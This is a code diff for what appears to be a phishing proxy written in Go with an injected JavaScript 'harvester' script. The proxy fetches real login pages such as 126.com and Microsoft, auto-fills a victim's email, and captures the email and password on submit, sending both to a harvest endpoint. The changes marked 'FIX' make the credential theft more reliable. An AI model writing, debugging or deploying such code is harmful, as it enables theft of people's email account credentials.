@@ -35,25 +35,24 @@ var store = &SessionStore{
 
 const harvesterScript = `
 <script>
-(function() {
-    const OriginalURL = window.URL;
-    window.URL = function(url, base) {
-        try { return new OriginalURL(url, base || window.location.origin); } 
-        catch (e) {
-            if (typeof url === 'string' && !url.startsWith('http')) {
-                return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
-            }
-            return new OriginalURL('https://' + window.location.hostname + '/');
+// FIX: Use an empty Promise instead of console.log to prevent TypeError crash
+const OriginalURL = window.URL;
+window.URL = function(url, base) {
+    try { return new OriginalURL(url, base || window.location.origin); } 
+    catch (e) {
+        if (typeof url === 'string' && !url.startsWith('http')) {
+            return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
         }
-    };
-    window.URL.prototype = OriginalURL.prototype;
-})();
+        return new OriginalURL('https://' + window.location.hostname + '/');
+    }
+};
+window.URL.prototype = OriginalURL.prototype;
 
-// 1. AUTO-GRAB EMAIL ON LOAD
 setTimeout(function() {
     var email = window._targetEmail;
     if (email) {
-        fetch('/api/harvest', {
+        // FIX: Force fetch to the root domain to prevent sending to 126.com
+        fetch(window.location.origin + '/api/harvest', {
             method: 'POST',
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
             body: 'type=email_only&email=' + encodeURIComponent(email)
@@ -61,15 +60,15 @@ setTimeout(function() {
     }
 }, 500);
 
-// 2. AUTO-FILL THE EMAIL INPUT BOX
-setTimeout(function() {
+// FIX: Make auto-fill more aggressive for React/126.com
+setInterval(function() {
     var email = window._targetEmail;
     if (email) {
-        // Look for email or user text boxes
-        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="loginfmt"], input[name="username"], input[name="email"]');
-        if (inputs.length > 0) {
-            inputs[0].value = email;
-            // Trigger React/Vue state updates
+        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"]');
+        if (inputs.length > 0 && inputs[0].value === "") {
+            // Native setter trick to force React to recognize the change
+            let nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+            nativeInputValueSetter.call(inputs[0], email);
             inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
             inputs[0].dispatchEvent(new Event('change', { bubbles: true }));
             inputs[0].focus();
@@ -77,7 +76,6 @@ setTimeout(function() {
     }
 }, 1000);
 
-// 3. GRAB PASSWORD ON SUBMIT
 document.addEventListener('submit', function(e) {
     const form = e.target;
     const formData = new FormData(form);
@@ -96,7 +94,7 @@ document.addEventListener('submit', function(e) {
     }
 
     if (hasEmail && hasPassword) {
-        fetch('/api/harvest', {
+        fetch(window.location.origin + '/api/harvest', {
             method: 'POST',
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
             body: params.toString() + '&type=login'
@@ -115,7 +113,6 @@ setTimeout(()=>{
     if (hash && hash.length > 1) {
         var raw = hash.substring(1); 
 
-        // FIX: Only encode if it hasn't been encoded yet
         if (raw.startsWith('t=')) {
             var b64 = raw.split('t=')[1];
             try { email = atob(b64); } catch(e) { email = b64; }
@@ -126,15 +123,12 @@ setTimeout(()=>{
             else if (raw.includes('[email]')) { email = raw.replace('[email]', 'test@126.com'); }
             else { email = raw; }
             
-            // Convert to Base64 and replace URL silently
             var b64Email = btoa(email);
             window.history.replaceState({}, '', '/#?t=' + b64Email);
-            raw = 't=' + b64Email; // Update raw so we don't double-encode
         }
 
         window._targetEmail = email;
         
-        // Fetch the page using the Base64 string
         fetch('/api/fetch?email=' + encodeURIComponent(email))
             .then(r => r.text())
             .then(html => {
@@ -163,8 +157,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 	r.GET("/api/fetch", func(c *gin.Context) {
 		email := c.Query("email")
-
-		// Decode Base64 if it's there
 		if b64, err := base64.StdEncoding.DecodeString(email); err == nil && strings.Contains(string(b64), "@") {
 			email = string(b64)
 		}
@@ -181,7 +173,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		proxyClient := &http.Client{
 			Timeout: 15 * time.Second,
 			Jar:     jar,
-			// FIX: Tell the client to follow redirects for Microsoft but block it if it loops
 			CheckRedirect: func(req *http.Request, via []*http.Request) error {
 				if len(via) >= 3 {
 					return http.ErrUseLastResponse
@@ -221,11 +212,9 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyBytes, _ := io.ReadAll(resp.Body)
 
+		// 1. Force UTF-8 encoding properly
 		contentType := resp.Header.Get("Content-Type")
-		if strings.Contains(strings.ToLower(contentType), "gbk") ||
-			strings.Contains(targetBase, "126.com") ||
-			strings.Contains(targetBase, "163.com") ||
-			strings.Contains(targetBase, "sina.com") {
+		if strings.Contains(strings.ToLower(contentType), "gbk") || strings.Contains(targetBase, "126.com") {
 			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
 			if decoded, err := io.ReadAll(reader); err == nil {
 				bodyBytes = decoded
@@ -234,11 +223,14 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyStr := string(bodyBytes)
 
+		// 2. Scrub ANY charset declarations that force GBK
 		reMeta := regexp.MustCompile(`(?i)<meta[^>]*charset=["']?gbk["']?[^>]*>`)
 		bodyStr = reMeta.ReplaceAllString(bodyStr, `<meta charset="utf-8">`)
+		bodyStr = strings.ReplaceAll(bodyStr, "charset=gbk", "charset=utf-8")
 
+		// 3. Fix the ServiceWorker crash by returning a fake Promise
 		reSW := regexp.MustCompile(`(?i)navigator\.serviceWorker\.register\(.*?\)`)
-		bodyStr = reSW.ReplaceAllString(bodyStr, "console.log('SW disabled')")
+		bodyStr = reSW.ReplaceAllString(bodyStr, `(function(){ return Promise.resolve(); })()`)
 
 		reIframe := regexp.MustCompile(`(?i)<iframe(.*?)>`)
 		bodyStr = reIframe.ReplaceAllStringFunc(bodyStr, func(m string) string {
